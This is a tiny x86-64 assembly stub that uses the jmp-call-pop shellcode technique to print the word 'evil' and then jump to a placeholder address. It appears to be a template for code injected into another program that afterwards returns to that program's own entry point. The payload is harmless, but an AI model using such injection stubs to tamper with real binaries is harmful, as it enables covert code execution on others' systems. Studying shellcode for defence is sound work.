BITS 64 

jmp short b
a:
    xor rax, rax 
    pop rcx
    mov rbx, 1
    mov rdx, 4
    mov rax, 4
    int 0x80

    xor rcx, rcx
    xor rbx, rbx
    xor rdx, rdx

    mov rax, 0x0011223344556677
    jmp rax

b:
    call a
    db "evil"
